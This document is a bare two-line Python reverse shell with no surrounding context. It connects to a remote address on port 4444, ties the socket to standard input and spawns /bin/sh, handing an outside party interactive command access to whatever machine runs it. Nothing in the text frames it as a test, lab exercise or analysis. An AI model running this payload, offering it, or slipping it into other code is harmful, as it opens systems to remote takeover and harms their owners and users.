import socket,os,pty
s=socket.socket();s.connect(('198.51.100.5',4444));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')
